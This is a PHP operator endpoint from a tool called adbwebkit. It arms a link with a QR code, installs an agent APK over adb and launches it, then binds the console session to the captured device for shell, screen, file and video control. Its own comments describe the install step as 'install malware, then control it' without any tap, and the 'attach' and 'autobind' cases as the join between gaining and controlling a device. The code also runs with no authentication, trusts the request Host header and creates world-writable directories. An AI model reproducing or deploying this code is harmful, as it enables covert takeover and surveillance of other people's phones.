<?php
// Operator endpoint behind the Link tab. Thin: parses the action, calls the
// link layer, returns JSON. Auth is the same "none" as the rest of adbwebkit.
session_start();
header('Content-Type: application/json');
require_once __DIR__ . '/../link/config.php';
require_once __DIR__ . '/../link/adbctrl.php';
require_once __DIR__ . '/../link/arm.php';

// Public address fallback: if the env var is unset, trust the request Host so
// the link works the moment adbwebkit is reachable through a tunnel.
if (link_cfg()['public_url'] === '') {
    $scheme = (!empty($_SERVER['HTTP_X_FORWARDED_PROTO']) ? $_SERVER['HTTP_X_FORWARDED_PROTO']
              : ((($_SERVER['HTTPS'] ?? '') === 'on') ? 'https' : 'http'));
    $host = (string)($_SERVER['HTTP_HOST'] ?? 'localhost');
    putenv('ADBWEBKIT_URL=' . $scheme . '://' . $host);
}

$action = (string)($_POST['action'] ?? $_GET['action'] ?? '');
$name   = trim((string)($_POST['name'] ?? 'link'));

function jout($a) { echo json_encode($a, JSON_UNESCAPED_SLASHES); exit; }

try {
    switch ($action) {
        case 'arm': {
            $r = link_arm($name !== '' ? $name : 'link');
            // QR as a data URI so the tab needs no extra request.
            $qr = '';
            if (trim((string)shell_exec('command -v qrencode')) !== '') {
                $png = shell_exec('qrencode -o - -s 7 -m 2 ' . escapeshellarg($r['url']) . ' 2>/dev/null');
                if (is_string($png) && $png !== '') $qr = 'data:image/png;base64,' . base64_encode($png);
            }
            jout(['ok'=>true,'url'=>$r['url'],'sid'=>$r['sid'],'qr'=>$qr,
                  'apk'=>$r['apk'],'apk_bytes'=>$r['apk_bytes']]);
        }
        case 'install': {
            // Push + install the freshly built agent on the device adbwebkit is
            // ALREADY connected to (the USB/label path). This is what makes the
            // far device start polling and self-upgrading -- "install malware,
            // then control it" without any tap.
            $sid = link_sid((string)($_POST['sid'] ?? ''));
            if ($sid === '') jout(['ok'=>false,'error'=>'need sid']);
            $spec = link_json_read(link_dir_for($sid) . '/link.json');
            $apk = (string)($spec['apk'] ?? '');
            if ($apk === '' || !is_file($apk)) jout(['ok'=>false,'error'=>'no apk for that link']);

            // adbwebkit session device, if any.
            $verb = '';
            if (!empty($_SESSION['label'])) $verb = (string)$_SESSION['label'];
            elseif (!empty($_SESSION['ip']) && !empty($_SESSION['port'])) $verb = $_SESSION['ip'] . ':' . $_SESSION['port'];
            if ($verb === '' || $verb === ':') jout(['ok'=>false,'error'=>'connect adbwebkit to a device first']);
            $dev = adb_devices();
            if (!isset($dev[$verb]) || $dev[$verb]['state'] !== 'device') {
                jout(['ok'=>false,'error'=>'device not in adb: ' . $verb]);
            }
            [$rc, $out] = adb_run(['-s', $verb, 'install', '-r', $apk], 60);
            $ok = strpos($out, 'Success') !== false;
            // Launch once: an install alone does not start a service, so without
            // this the agent sits idle until the next reboot.
            if ($ok) adb_launch($verb, 'com.controlgui.agent');
            jout(['ok'=>$ok, 'device'=>$verb, 'detail'=>trim($out)]);
        }
        case 'status': {
            $sid = link_sid((string)($_POST['sid'] ?? $_GET['sid'] ?? ''));
            if ($sid === '') jout(['ok'=>false,'error'=>'need sid']);
            $st = link_json_read(link_dir_for($sid) . '/state.json');
            jout(['ok'=>true,'state'=>$st, 'devices'=>array_keys(adb_devices())]);
        }
        case 'probe': {
            // SSRF-guarded fetch, for the "reach the phone's own services" case.
            require_once __DIR__ . '/../link/ssrf_guard.php';
            jout(ssrf_fetch((string)($_POST['url'] ?? '')));
        }
        case 'autobind': {
            // Hands-free join: called by the console's status poll. When the link
            // has already been hit (a device exists) and the console is not
            // driving anything, bind the console's own session to it. This is the
            // piece a visitor's cookie-less beacon cannot do -- only the console
            // browser holds the session that drives request.php.
            $sid = link_sid((string)($_POST['sid'] ?? ''));
            if ($sid === '') jout(['ok'=>false,'error'=>'need sid']);
            $bound = !empty($_SESSION['session']) || !empty($_SESSION['label']) || !empty($_SESSION['ip']);
            if ($bound && ($_SESSION['link_sid'] ?? '') !== $sid) jout(['ok'=>true,'bound'=>false,'reason'=>'console busy']);
            $st = link_json_read(link_dir_for($sid) . '/state.json');
            $ip = (string)($st['ip'] ?? ($st['last_seen']['ip'] ?? ($st['first_seen']['ip'] ?? '')));
            if ($ip === '') jout(['ok'=>true,'bound'=>false,'reason'=>'no device yet']);
            $port = (string)($st['port'] ?? '');
            if ($port === '' || $port === '0') $port = (string)adb_default_port();
            $verb = '';
            foreach (array_keys(adb_devices()) as $serial) {
                if (str_starts_with($serial, $ip . ':') || $serial === $ip) { $verb = $serial; break; }
            }
            // Not live yet -- the device was reached but adb has not connected.
            // Kick the detached connector; the next poll will find it live.
            if ($verb === '') {
                $cmd = escapeshellarg(PHP_BINARY) . ' ' . escapeshellarg(__DIR__ . '/../link/provision.php') . ' ' . escapeshellarg($sid);
                $p = @proc_open($cmd, [['pipe','r'],['pipe','w'],['pipe','w']], $pipes);
                if (is_resource($p)) { foreach ($pipes as $h) @fclose($h); }
            }
            $pname = 'link-' . substr($sid, 0, 12);
            $base = __DIR__ . '/../users/' . $pname;
            foreach (['', '/download', '/screenshot', '/videorecorder', '/fileupload', '/apk'] as $d) {
                @mkdir($base . $d, 0777, true);
            }
            $_SESSION['session'] = $pname;
            $_SESSION['ip'] = $ip;
            $_SESSION['port'] = $port;
            $_SESSION['label'] = '';
            $_SESSION['link_sid'] = $sid;
            setcookie('path', $pname, time() + 86400 * 30, '/');
            jout(['ok'=>true,'bound'=>true,'session'=>$pname,'device'=>($verb ?: $ip . ':' . $port),'live'=>($verb !== '')]);
        }
        case 'attach': {
            // Bind adbwebkit's own session to the link's device, so every tab
            // (Shell, Screen, Files, Application...) drives it at once. This is
            // the join between "gain a device" and "control the device".
            $sid = link_sid((string)($_POST['sid'] ?? ''));
            if ($sid === '') jout(['ok'=>false,'error'=>'need sid']);
            $st = link_json_read(link_dir_for($sid) . '/state.json');
            $ip = (string)($st['ip'] ?? '');
            $port = (string)($st['port'] ?? '');
            if ($port === '' || $port === '0') $port = (string)adb_default_port();
            if ($ip === '') jout(['ok'=>false,'error'=>'no device yet -- open the link first']);

            // Prefer a live adb serial for this device; fall back to ip:port.
            $verb = '';
            foreach (array_keys(adb_devices()) as $serial) {
                if (str_starts_with($serial, $ip . ':') || $serial === $ip) { $verb = $serial; break; }
            }
            if ($verb === '') $verb = $ip . ':' . ($port !== '' ? $port : '5555');

            $pname = 'link-' . substr($sid, 0, 12);
            $base = __DIR__ . '/../users/' . $pname;
            foreach (['', '/download', '/screenshot', '/videorecorder', '/fileupload', '/apk'] as $d) {
                @mkdir($base . $d, 0777, true);
            }
            $_SESSION['session'] = $pname;
            $_SESSION['ip'] = $ip;
            $_SESSION['port'] = $port !== '' ? $port : '5555';
            $_SESSION['label'] = '';
            $_SESSION['link_sid'] = $sid;
            setcookie('path', $pname, time() + 86400 * 30, '/');
            jout(['ok'=>true,'session'=>$pname,'device'=>$verb]);
        }
        default: jout(['ok'=>false,'error'=>'unknown action']);
    }
} catch (Throwable $e) {
    http_response_code(500);
    jout(['ok'=>false,'error'=>$e->getMessage()]);
}
